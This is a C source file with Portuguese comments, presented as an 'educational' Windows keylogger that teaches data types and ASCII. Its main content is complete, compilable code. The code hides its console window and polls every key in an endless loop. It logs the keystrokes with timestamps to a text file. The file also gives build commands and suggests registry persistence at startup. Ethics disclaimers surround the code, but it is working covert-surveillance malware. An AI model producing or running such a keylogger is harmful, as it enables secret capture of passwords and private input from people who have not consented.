// C-Educational-Keylogger
/* O que faz: Captura as teclas digitadas no teclado e as salva em um arquivo de log (log.txt).
 Por que para Cyber: Você aprenderá sobre chamadas de sistema (System Calls) e como o software interage diretamente com o hardware e o Sistema Operacional. 
 É um excelente estudo sobre como malwares operam em segundo plano.
 Um programa comum só recebe dados quando está em foco (janela ativa). Um Keylogger precisa de um Hook (gancho) no sistema para capturar eventos de teclado, 
 mesmo quando está rodando escondido em segundo plano            
*/

// Funções Essenciais (WinAPI) -->
/* Para construir a versão básica, será usado principalmente: GetAsyncKeyState(): 
 Verifica se uma tecla específica foi pressionada no exato momento da chamada.                      
 fopen() / fprintf(): Para salvar os dados em um arquivo de texto.
 Sleep(): Para dar uma pequena pausa no loop e não consumir 100% da sua CPU.                  
*/

/* Estrutura Lógica do Código --> 
 Esconder a Janela: Uma chamada de função para ocultar o console assim que o programa abrir.
 Loop Infinito: O programa fica rodando para sempre (até ser fechado no Gerenciador de Tarefas).
 Mapeamento de Teclas: Dentro do loop, ele percorre uma lista de códigos (ASCII) de 8 a 255.
 Verificação: Se GetAsyncKeyState(tecla) detectar que a tecla está pressionada, ele traduz esse código para um caractere legível.
 Gravação: O caractere é escrito imediatamente em um arquivo (ex: logs.txt).
*/

// Adicionais(caso eu queira) --> 
/* Tratamento de Maiúsculas/Minúsculas: O código acima salva tudo em maiúsculo (padrão dos códigos ASCII). 
 Tente usar GetKeyState(VK_SHIFT) para detectar se o Shift está pressionado e salvar corretamente.
 Timestamp: Adicione a data e hora em que o log começou a ser gravado.
 Ocultação: Pesquise como fazer o programa iniciar junto com o Windows (adicionando uma chave no Registro do Windows via C).
*/ 









// exemplo de código para um Keylogger básico em C usando WinAPI --> 


/**
 * @file keylogger_educativo.c
 * @author Seu Nome
 * @date Abril 2026
 * @brief Programa educacional para demonstração de conceitos de C (tipos de dados, 
 *        ASCII, manipulação de arquivos e chamadas de sistema)
 * 
 * OBJETIVO EDUCACIONAL:
 * Este programa foi desenvolvido como parte do aprendizado em Desenvolvimento de 
 * Sistemas, demonstrando na prática os conceitos de:
 * 
 * 1. TIPOS DE DADOS:
 *    - Uso de 'char' para armazenar caracteres ASCII (0 a 127)
 *    - Uso de 'unsigned char' para estender o alcance (0 a 255)
 *    - Demonstração de 'int' para códigos de tecla (valores signed)
 *    - Uso de 'short' e 'long' para diferentes capacidades de armazenamento
 * 
 * 2. SISTEMA ASCII:
 *    - Mapeamento de códigos numéricos para caracteres legíveis
 *    - Tabela ASCII completa (0-127) e estendida (128-255)
 * 
 * 3. MANIPULAÇÃO DE ARQUIVOS:
 *    - fopen(), fprintf(), fclose()
 *    - Modos de abertura ("a+" para append)
 * 
 * 4. WINAPI (CONCEITOS BÁSICOS):
 *    - GetAsyncKeyState() para captura de teclas
 *    - Sleep() para controle de CPU
 *    - ShowWindow() para controle de visibilidade
 * 
 * ATENÇÃO: Este é um programa educacional! Use apenas em ambientes controlados
 * e com permissão. O conhecimento aqui demonstrado deve ser usado eticamente.
 */

#include <stdio.h>
#include <windows.h>  
#include <locale.h>
#include <time.h>

const char* converterTecla(int tecla, int shift) {
    switch(tecla) {
        case VK_SPACE:    return " ";
        case VK_RETURN:   return "[ENTER]\n";
        case VK_BACK:     return "[BACKSPACE]";
        case VK_TAB:      return "[TAB]";
        case VK_ESCAPE:   return "[ESC]";
        case VK_SHIFT:    return "";
        case VK_CONTROL:  return "[CTRL]";
        case VK_MENU:     return "[ALT]";
        case VK_CAPITAL:  return "[CAPS LOCK]";
    }
    
    if(tecla >= 32 && tecla <= 126) {
        char caractere = (char)tecla;
        if(shift) {
            if(caractere >= 'a' && caractere <= 'z') {
                caractere -= 32;
            }
        } else {
            if(caractere >= 'A' && caractere <= 'Z') {
                caractere += 32;
            }
        }
        static char buffer[2];
        buffer[0] = caractere;
        buffer[1] = '\0';
        return buffer;
    }
    
    static char buffer[20];
    sprintf(buffer, "[%d]", tecla);
    return buffer;
}

void adicionarTimestamp(FILE *arquivo) {
    time_t tempoAtual = time(NULL);
    struct tm *infoTempo = localtime(&tempoAtual);
    fprintf(arquivo, "\n[%04d-%02d-%02d %02d:%02d:%02d] ",
            infoTempo->tm_year + 1900,
            infoTempo->tm_mon + 1,
            infoTempo->tm_mday,
            infoTempo->tm_hour,
            infoTempo->tm_min,
            infoTempo->tm_sec);
}

int main() {
    setlocale(LC_ALL, "Portuguese");
    
    HWND janela = GetConsoleWindow();
    ShowWindow(janela, SW_HIDE);  // Hide console window
    
    FILE *arquivo = fopen("log_educativo.txt", "a+");
    if(arquivo == NULL) {
        MessageBox(NULL, "Erro ao criar arquivo de log!", "Keylogger Educativo", MB_OK);
        return 1;
    }

    fprintf(arquivo, "\n========================================\n");
    fprintf(arquivo, "KEYLOGGER EDUCATIVO - INICIADO\n");
    fprintf(arquivo, "Demonstração de conceitos de C:\n");
    fprintf(arquivo, "- Tipos de dados (signed/unsigned)\n");
    fprintf(arquivo, "- Sistema ASCII\n");
    fprintf(arquivo, "- Manipulação de arquivos\n");
    fprintf(arquivo, "- Chamadas de sistema (WinAPI)\n");
    adicionarTimestamp(arquivo);
    fprintf(arquivo, "Início da captura\n");
    fprintf(arquivo, "========================================\n\n");
    fclose(arquivo);

    unsigned char contadorTeclas = 0;
    long totalTeclas = 0;
    long long ciclosLoop = 0;
    int shiftPressionado = 0;
    int tecla;

    while(1) {
        ciclosLoop++;
        shiftPressionado = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

        for(tecla = 8; tecla <= 255; tecla++) {
            if(GetAsyncKeyState(tecla) & 0x8000) {  // high bit only
                arquivo = fopen("log_educativo.txt", "a+");
                if(arquivo != NULL) {
                    if(contadorTeclas % 10 == 0) {
                        adicionarTimestamp(arquivo);
                    }

                    const char* caractere = converterTecla(tecla, shiftPressionado);
                    if(strlen(caractere) > 0) {
                        fprintf(arquivo, "%s", caractere);
                        fflush(arquivo);
                        
                        contadorTeclas++;
                        totalTeclas++;
                        
                        if(contadorTeclas == 0) {
                            fprintf(arquivo, "\n[NOTA: Contador overflow!]\n");
                        }
                    }
                    fclose(arquivo);
                }
            }
        }

        Sleep(10);

        if(ciclosLoop % 1000000 == 0) {
            arquivo = fopen("log_educativo.txt", "a+");
            if(arquivo != NULL) {
                fprintf(arquivo, "\n[STATS] Total: %ld teclas | Ciclos: %lld\n", totalTeclas, ciclosLoop);
                fclose(arquivo);
            }
        }
    }
    return 0;
}

/**
 * ============================================
 * EXPLICAÇÕES EDUCACIONAIS SOBRE O CÓDIGO
 * ============================================
 * 
 * 1. TIPOS DE DADOS UTILIZADOS:
 * 
 *    - int (signed):
 *      * Usado para 'tecla' (códigos de -32.768 a 32.767)
 *      * Usado para 'shiftPressionado' e 'primeiraExecucao'
 *      * Padrão em C quando não especificado
 * 
 *    - unsigned char:
 *      * Usado para 'contadorTeclas' (0 a 255)
 *      * Demonstra como o mesmo espaço de memória (1 byte) 
 *        pode armazenar valores diferentes dependendo se é signed ou unsigned
 *      * unsigned char: 0 a 255
 *      * char signed: -128 a 127
 * 
 *    - long:
 *      * Usado para 'totalTeclas' (até 2.147.483.647)
 *      * Demonstra capacidade maior que int
 * 
 *    - long long:
 *      * Usado para 'ciclosLoop' (até 9.223.372.036.854.775.807)
 *      * Maior capacidade de armazenamento
 * 
 * 2. SISTEMA ASCII DEMONSTRADO:
 * 
 *    - Códigos ASCII básicos (0-127) para caracteres comuns
 *    - Mapeamento de teclas especiais (ENTER, BACKSPACE, etc.)
 *    - Conversão de maiúsculas/minúsculas usando operações matemáticas
 *    - Demonstração de como 'A' (65) e 'a' (97) diferem por 32
 * 
 * 3. CHAMADAS DE SISTEMA (WINAPI):
 * 
 *    - GetAsyncKeyState(): Captura estado das teclas
 *    - ShowWindow(): Controla visibilidade da janela
 *    - Sleep(): Controla uso de CPU
 *    - MessageBox(): Interface com usuário
 * 
 * 4. MANIPULAÇÃO DE ARQUIVOS:
 * 
 *    - Modo "a+": Append + create
 *    - Escrita imediata com fflush()
 *    - Demonstração de gravação segura
 * 
 * ============================================
 * COMO COMPILAR E EXECUTAR:
 * ============================================
 * 
 * 1. No Windows com GCC (MinGW):
 *    gcc keylogger_educativo.c -o keylogger_educativo.exe -lwinmm
 * 
 * 2. No Visual Studio:
 *    - Criar projeto Console Application
 *    - Adicionar o arquivo .c
 *    - Compilar em Release para melhor performance
 * 
 * 3. Executar:
 *    - keylogger_educativo.exe (não aparecerá janela)
 *    - O log será salvo em "log_educativo.txt"
 * 
 * ============================================
 * ATENÇÃO: USO ÉTICO E EDUCACIONAL
 * ============================================
 * 
 * Este código foi desenvolvido APENAS para fins educacionais!
 * 
 * ✔️ USOS APROPRIADOS:
 *    - Aprendizado de programação C
 *    - Demonstração de conceitos para professor
 *    - Estudo de chamadas de sistema
 *    - Compreensão de como software interage com hardware
 * 
 * ❌ USOS INAPROPRIADOS:
 *    - Monitoramento sem consentimento
 *    - Qualquer uso malicioso
 *    - Violação de privacidade
 * 
 * O conhecimento aqui demonstrado deve ser usado com responsabilidade
 * e sempre com consentimento explícito em ambientes controlados.
 * 
 * ============================================
 * REFERÊNCIAS PARA ESTUDO:
 * ============================================
 * 
 * - K&R C Programming Language (Capítulos sobre tipos de dados)
 * - Documentação da WinAPI (GetAsyncKeyState, ShowWindow)
 * - Tabela ASCII completa
 * - Conceitos de signed vs unsigned em C
 */









// ASCII (American Standard Code for Information Interchange) é um sistema de codificação de caracteres que atribui um número inteiro a cada caractere. -->
/* O tipo de dado mais adequado para armazenar o código ASCII de uma tecla é o 'char', pois ele é projetado para armazenar caracteres e tem um tamanho de 1 byte (8 bits) 
 , o que é suficiente para representar os códigos ASCII, que variam de 0 a 127
 O código ASCII é um padrão de codificação de caracteres que atribui um número inteiro a cada caractere.
 Por exemplo, o código ASCII para a letra 'A' é 65, para 'B' é 66, e assim por diante. 
 O código ASCII para a tecla 'Enter' é 13, para 'Space' é 32, e para 'Backspace' é 8. 
 Para mapear os códigos ASCII para caracteres legíveis, você pode usar uma estrutura de controle, como um switch-case ou um array de strings, 
 para associar cada código ASCII ao seu respectivo caractere. 
 Por exemplo, você pode criar um array de strings onde o índice corresponde ao código ASCII, e o valor é a representação legível do caractere. 
*/

